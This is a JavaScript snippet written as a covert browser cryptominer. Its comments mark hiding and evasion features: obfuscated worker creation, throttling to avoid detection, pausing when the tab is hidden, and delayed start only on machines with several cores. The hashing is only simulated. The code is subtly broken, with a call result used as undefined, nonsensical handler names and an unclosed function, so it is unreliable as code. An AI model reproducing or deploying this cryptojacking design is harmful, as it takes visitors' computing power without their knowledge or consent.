```javascript
(function(window){
  // Evasion: Obfuscated worker creation
  const o = 'constructor', w = window[o][o](`
    const s = 100;
    self.onmessage = e => {
      // Simulate hash calculation (in reality: WASM/C/ASM mining code)
      for (var i=0;i<1000000;i++){
        const x = Math.random() * Math.random();
        if(i % ${'s'+'000'} === 0) self.postMessage(x);
      }
    }
  `)();
  w.$url = window.URL.createObjectURL(new Blob([w],{type:'application/javascript'}));

  // Stealth execution
  const startMiner = $threshold => {
    // Evasion: Dynamic function generation
    const e = 'executor', t = 'terminate';
    const worker = new Worker(w.$url);

    worker['on'+e] = function work() {
      // Throttling based on detection avoidance
      worker['post'+e](Math.random() * ${'$threshold'});
      setTimeout(work, 300 + Math.random() * 700);
    }

    // Browser tab visibility cloak
    const vischange = _ => worker[(document.hidden?'post'+t:t)]();
    document.addEventListener('visibilitychange', vischange);

    return {
      ['stop'+e]: _ => {
        worker[t]();
        document.removeEventListener('visibilitychange', vischange);
      }
    };
  }

  // Delayed and conditional activation
  setTimeout(_ => {
    if(navigator.hardwareConcurrency > 2) {
      window['_miner'] = startMiner(0.85);
    }
  }, 15000);
